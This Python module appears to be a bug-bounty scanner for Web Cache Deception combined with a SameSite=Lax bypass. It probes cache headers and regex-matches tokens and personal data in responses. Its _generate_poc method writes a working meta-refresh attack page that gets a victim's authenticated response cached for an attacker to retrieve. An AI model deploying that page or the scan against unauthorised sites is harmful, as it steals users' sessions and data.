"""
Web Cache Deception (WCD) + SameSite Lax Bypass via Top-Level Navigation
Skill #50 — WebCacheDeception

Research basis:
  tinopreter (Clement Osei-Somuah) — "Cracking SameSite for a $2,000 Web Cache Deception"
  https://medium.com/@tinopreter/cracking-samesite-for-a-2-000-web-cache-deception-746972278412
  Published: May 29, 2026 — $2,000 bounty on HackerOne

Attack chain:
  ① Target page caches response without Cache-Control: private
  ② Sensitive user data (JWT / PII / session token) embedded in cached page
  ③ Attacker crafts URL with cache buster (?cb=UNIQUE)
  ④ Victim visits attacker-hosted page → meta-refresh forces top-level navigation
       → SameSite=Lax cookies included (top-level navigation exception)
  ⑤ Victim's authenticated response cached under cache-buster URL
  ⑥ Attacker requests same URL → receives victim's cached response → extracts JWT/token

SameSite bypass detail:
  - <img src> / XHR / fetch = cross-site subresource → SameSite=Lax blocks cookies
  - <meta http-equiv="refresh"> = top-level navigation (address bar changes)
    → SameSite=Lax ALLOWS cookies (by spec — browser interprets as user navigation)

Evidence levels:
  VERIFIED  — confirmed via HTTP response header analysis
  LIKELY    — strong indicators but requires victim interaction to confirm
  INFERRED  — logic-based inference
"""

from __future__ import annotations

import hashlib
import re
import time
import urllib.parse
from dataclasses import dataclass, field
from typing import Optional

import requests
from requests.adapters import HTTPAdapter

# ─────────────────────────────────────────────
# Data Classes
# ─────────────────────────────────────────────

@dataclass
class WcdFinding:
    finding_type: str        # 발견 유형
    evidence_level: str      # VERIFIED / LIKELY / INFERRED
    severity: str            # Critical / High / Medium / Info
    description: str
    url: str = ""
    cache_header: str = ""   # X-Cache / CF-Cache-Status value
    cache_control: str = ""  # Cache-Control header value
    sensitive_data: list[str] = field(default_factory=list)   # 발견된 민감 데이터
    samesite_value: str = ""    # SameSite cookie attribute
    poc_html: str = ""          # 생성된 PoC HTML


@dataclass
class WcdResult:
    target: str
    triggered: bool = False
    findings: list[WcdFinding] = field(default_factory=list)
    cacheable: bool = False
    has_sensitive_data: bool = False
    samesite_bypass_needed: bool = False
    exploitable: bool = False
    poc_html: str = ""
    poc_url: str = ""
    severity: str = "Info"
    summary: str = ""


# ─────────────────────────────────────────────
# Sensitive data patterns
# ─────────────────────────────────────────────

SENSITIVE_PATTERNS = {
    "jwt": re.compile(r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}'),
    "bearer_token": re.compile(r'Bearer\s+[A-Za-z0-9\-._~+/]+=*', re.IGNORECASE),
    "api_key": re.compile(r'(?:api[_-]?key|apikey|api_token)\s*[:=]\s*["\']?([A-Za-z0-9\-._]{16,})', re.IGNORECASE),
    "session_token": re.compile(r'(?:session[_-]?(?:id|token)|sess(?:ion)?_id)\s*[:=]\s*["\']?([A-Za-z0-9\-]{16,})', re.IGNORECASE),
    "access_token": re.compile(r'(?:access[_-]?token|auth[_-]?token)\s*[:=]\s*["\']?([A-Za-z0-9\-._]{16,})', re.IGNORECASE),
    "email_in_source": re.compile(r'[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}'),
    "user_id": re.compile(r'(?:user[_-]?id|userId|uid)\s*[:=]\s*["\']?(\d{3,})', re.IGNORECASE),
    "credit_card": re.compile(r'\b(?:\d[ -]?){13,16}\b'),
    "private_key_hint": re.compile(r'-----BEGIN (?:RSA )?PRIVATE KEY-----'),
}

# Cache indicator headers
CACHE_HIT_VALUES = {"hit", "cached", "tcp_hit", "mem_hit", "disk_hit", "stale", "revalidated"}
CACHE_MISS_VALUES = {"miss", "expired", "bypass", "dynamic", "tcp_miss"}


# ─────────────────────────────────────────────
# Scanner
# ─────────────────────────────────────────────

class WebCacheDeceptionScanner:
    """Web Cache Deception + SameSite Lax Bypass Scanner"""

    CACHE_HEADERS = [
        "x-cache",
        "cf-cache-status",
        "x-cache-status",
        "x-cache-hits",
        "age",
        "x-varnish",
        "x-cdn-cached",
        "x-proxy-cache",
        "x-nginx-cache",
        "x-fastly-cache",
        "surrogate-key",
        "cdn-cache-control",
    ]

    # Paths likely to contain user-specific data
    SENSITIVE_PATHS = [
        "/",
        "/home",
        "/dashboard",
        "/account",
        "/profile",
        "/settings",
        "/me",
        "/user",
        "/my",
        "/mypage",
        "/panel",
        "/app",
    ]

    def __init__(self, target: str, session: Optional[requests.Session] = None,
                 timeout: int = 12):
        self.target = target.rstrip("/")
        self.timeout = timeout
        self.sess = session or self._make_session()
        self.result = WcdResult(target=target)

    def _make_session(self) -> requests.Session:
        s = requests.Session()
        s.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                          "AppleWebKit/537.36 (KHTML, like Gecko) "
                          "Chrome/125.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        })
        adapter = HTTPAdapter(max_retries=1)
        s.mount("http://", adapter)
        s.mount("https://", adapter)
        return s

    def _fetch(self, url: str, params: dict | None = None) -> requests.Response | None:
        try:
            r = self.sess.get(url, params=params, timeout=self.timeout,
                              allow_redirects=True, verify=False)
            return r
        except Exception:
            return None

    # ──────────────────────────────────────────
    # Cache analysis helpers
    # ──────────────────────────────────────────

    def _get_cache_info(self, resp: requests.Response) -> dict:
        """응답에서 캐시 관련 헤더 추출"""
        info = {
            "cache_hit": False,
            "cache_miss": False,
            "cacheable": False,
            "cache_header_name": "",
            "cache_header_value": "",
            "cache_control": resp.headers.get("Cache-Control", ""),
            "age": resp.headers.get("Age", ""),
            "etag": resp.headers.get("ETag", ""),
            "vary": resp.headers.get("Vary", ""),
        }

        for h in self.CACHE_HEADERS:
            val = resp.headers.get(h, "").lower()
            if val:
                info["cache_header_name"] = h
                info["cache_header_value"] = val
                if any(v in val for v in CACHE_HIT_VALUES):
                    info["cache_hit"] = True
                elif any(v in val for v in CACHE_MISS_VALUES):
                    info["cache_miss"] = True
                break

        # Age header presence = cached
        if info["age"] and info["age"] != "0":
            info["cache_hit"] = True

        # No "private" or "no-store" = potentially cacheable
        cc = info["cache_control"].lower()
        if "private" not in cc and "no-store" not in cc:
            info["cacheable"] = True

        return info

    def _has_private_in_cc(self, cache_control: str) -> bool:
        cc = cache_control.lower()
        return "private" in cc or "no-store" in cc

    # ──────────────────────────────────────────
    # Sensitive data detection
    # ──────────────────────────────────────────

    def _find_sensitive_data(self, body: str) -> list[str]:
        found = []
        for label, pattern in SENSITIVE_PATTERNS.items():
            matches = pattern.findall(body)
            if matches:
                found.append(f"{label}:{len(matches)}_matches")
        return found

    # ──────────────────────────────────────────
    # Cookie SameSite analysis
    # ──────────────────────────────────────────

    def _analyze_samesite(self, resp: requests.Response) -> str:
        """Set-Cookie 헤더에서 SameSite 값 추출"""
        cookies_raw = resp.raw.headers.getlist("Set-Cookie") if hasattr(resp.raw.headers, "getlist") else []
        if not cookies_raw:
            set_cookie = resp.headers.get("Set-Cookie", "")
            cookies_raw = [set_cookie] if set_cookie else []

        for cookie_str in cookies_raw:
            cl = cookie_str.lower()
            if "samesite=strict" in cl:
                return "Strict"
            if "samesite=lax" in cl:
                return "Lax"
            if "samesite=none" in cl:
                return "None"
        return "Lax"  # Browser default when not specified

    # ──────────────────────────────────────────
    # Cache buster confirmation
    # ──────────────────────────────────────────

    def _confirm_caching(self, url: str) -> tuple[bool, str, str]:
        """캐시 버스터로 실제 캐시 동작 확인 (MISS→HIT)"""
        cb = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
        bust_url = f"{url}{'&' if '?' in url else '?'}cb={cb}"

        # First request — should be MISS
        r1 = self._fetch(bust_url)
        if not r1:
            return False, "", ""
        info1 = self._get_cache_info(r1)

        # Brief wait
        time.sleep(1)

        # Second request — should be HIT if caching active
        r2 = self._fetch(bust_url)
        if not r2:
            return False, "", ""
        info2 = self._get_cache_info(r2)

        confirmed = info2["cache_hit"] and not info1["cache_hit"]
        return confirmed, info1["cache_header_value"], info2["cache_header_value"]

    # ──────────────────────────────────────────
    # PoC generation
    # ──────────────────────────────────────────

    def _generate_poc(self, target_url: str, cache_buster: str = "bingo_poc") -> tuple[str, str]:
        """SameSite bypass PoC HTML 생성"""
        poc_target = f"{target_url}{'&' if '?' in target_url else '?'}cb={cache_buster}"

        poc_html = f"""<!DOCTYPE html>
<html>
<head>
    <title>WCD PoC - Cache Deception via Top-Level Navigation</title>
    <!-- SameSite=Lax Bypass: meta-refresh = Top-Level Navigation
         Browser includes authenticated cookies on top-level navigation
         even when request originates cross-site -->
    <meta http-equiv="refresh" content="0; url={poc_target}">
</head>
<body>
    <h3>Redirecting for PoC...</h3>
    <!-- Fallback: anchor tag (requires user click) -->
    <p>If not redirected automatically,
       <a href="{poc_target}">click here</a>.</p>
    <hr>
    <small>
    After victim visits this page:<br>
    1. Victim's authenticated response cached at: {poc_target}<br>
    2. Attacker visits same URL to retrieve victim's cached JWT/session<br>
    </small>
</body>
</html>"""

        return poc_html, poc_target

    # ──────────────────────────────────────────
    # Main scan
    # ──────────────────────────────────────────

    def scan(self) -> WcdResult:
        self.result.triggered = True

        # Step 1: Fetch base page
        base_resp = self._fetch(self.target)
        if not base_resp or base_resp.status_code not in (200, 301, 302):
            self.result.summary = "Target unreachable"
            return self.result

        cache_info = self._get_cache_info(base_resp)
        samesite = self._analyze_samesite(base_resp)
        sensitive = self._find_sensitive_data(base_resp.text)

        # Step 2: Cache header detection
        if cache_info["cache_header_name"]:
            self.result.findings.append(WcdFinding(
                finding_type="cache_header_detected",
                evidence_level="VERIFIED",
                severity="Info",
                description=f"Cache header found: {cache_info['cache_header_name']}: "
                            f"{cache_info['cache_header_value']}",
                url=self.target,
                cache_header=cache_info["cache_header_value"],
                cache_control=cache_info["cache_control"],
            ))

        # Step 3: Cacheable without private
        if cache_info["cacheable"]:
            self.result.cacheable = True
            severity = "Medium"
            self.result.findings.append(WcdFinding(
                finding_type="cacheable_without_private",
                evidence_level="VERIFIED",
                severity=severity,
                description=f"Cache-Control lacks 'private'/'no-store': "
                            f"'{cache_info['cache_control']}' — "
                            "page may be publicly cached",
                url=self.target,
                cache_control=cache_info["cache_control"],
            ))

        # Step 4: Sensitive data in cacheable response
        if sensitive and cache_info["cacheable"]:
            self.result.has_sensitive_data = True
            self.result.findings.append(WcdFinding(
                finding_type="sensitive_data_in_cache",
                evidence_level="VERIFIED",
                severity="High",
                description=f"Sensitive data detected in cacheable response: "
                            f"{', '.join(sensitive)}",
                url=self.target,
                sensitive_data=sensitive,
                cache_control=cache_info["cache_control"],
            ))

        # Step 5: Confirm actual caching (MISS → HIT)
        cache_confirmed, miss_val, hit_val = self._confirm_caching(self.target)
        if cache_confirmed:
            self.result.findings.append(WcdFinding(
                finding_type="cache_confirmed_miss_to_hit",
                evidence_level="VERIFIED",
                severity="High",
                description=f"Caching confirmed: first request={miss_val or 'MISS'} "
                            f"→ second request={hit_val or 'HIT'}",
                url=self.target,
                cache_header=hit_val,
            ))

        # Step 6: SameSite analysis
        self.result.findings.append(WcdFinding(
            finding_type="samesite_cookie_value",
            evidence_level="VERIFIED",
            severity="Info",
            description=f"Session cookie SameSite={samesite} "
                        f"{'(browser default — Lax applies)' if samesite == 'Lax' else ''}",
            url=self.target,
            samesite_value=samesite,
        ))

        if samesite in ("Lax", "None"):
            self.result.samesite_bypass_needed = True
            self.result.findings.append(WcdFinding(
                finding_type="samesite_lax_bypass_possible",
                evidence_level="VERIFIED" if samesite == "Lax" else "LIKELY",
                severity="High",
                description=f"SameSite={samesite}: top-level navigation via "
                            "<meta http-equiv=refresh> bypasses cookie restriction — "
                            "attacker-hosted page can force authenticated cache request",
                url=self.target,
                samesite_value=samesite,
            ))

        # Step 7: Full exploitability check
        if (self.result.cacheable and self.result.has_sensitive_data
                and (cache_confirmed or cache_info["cache_hit"])):
            self.result.exploitable = True
            self.result.severity = "Critical"

            poc_html, poc_target = self._generate_poc(self.target)
            self.result.poc_html = poc_html
            self.result.poc_url = poc_target

            self.result.findings.append(WcdFinding(
                finding_type="wcd_exploitable",
                evidence_level="VERIFIED",
                severity="Critical",
                description="Web Cache Deception FULLY exploitable: "
                            "cacheable page contains sensitive data + "
                            "SameSite bypass via meta-refresh confirmed",
                url=self.target,
                poc_html=poc_html,
                sensitive_data=sensitive,
            ))

        elif self.result.cacheable and (cache_confirmed or cache_info["cache_hit"]):
            self.result.severity = "High"
            self.result.findings.append(WcdFinding(
                finding_type="wcd_likely",
                evidence_level="LIKELY",
                severity="High",
                description="Cache active without 'private' — "
                            "check if authenticated responses contain sensitive data",
                url=self.target,
            ))

        # Also check sensitive paths
        for path in self.SENSITIVE_PATHS:
            if path == "/":
                continue
            url2 = f"{self.target}{path}"
            r2 = self._fetch(url2)
            if not r2 or r2.status_code != 200:
                continue
            ci2 = self._get_cache_info(r2)
            sens2 = self._find_sensitive_data(r2.text)
            if ci2["cacheable"] and sens2:
                self.result.findings.append(WcdFinding(
                    finding_type="sensitive_path_cacheable",
                    evidence_level="LIKELY",
                    severity="High",
                    description=f"Sensitive path '{path}' is cacheable and contains: "
                                f"{', '.join(sens2)}",
                    url=url2,
                    cache_control=ci2["cache_control"],
                    sensitive_data=sens2,
                ))
                if not self.result.exploitable:
                    self.result.severity = "High"
                break

        # Summary
        n = len(self.result.findings)
        self.result.summary = (
            f"WCD scan: {n} findings | "
            f"cacheable:{self.result.cacheable} | "
            f"sensitive_data:{self.result.has_sensitive_data} | "
            f"exploitable:{self.result.exploitable} | "
            f"severity:{self.result.severity}"
        )
        return self.result
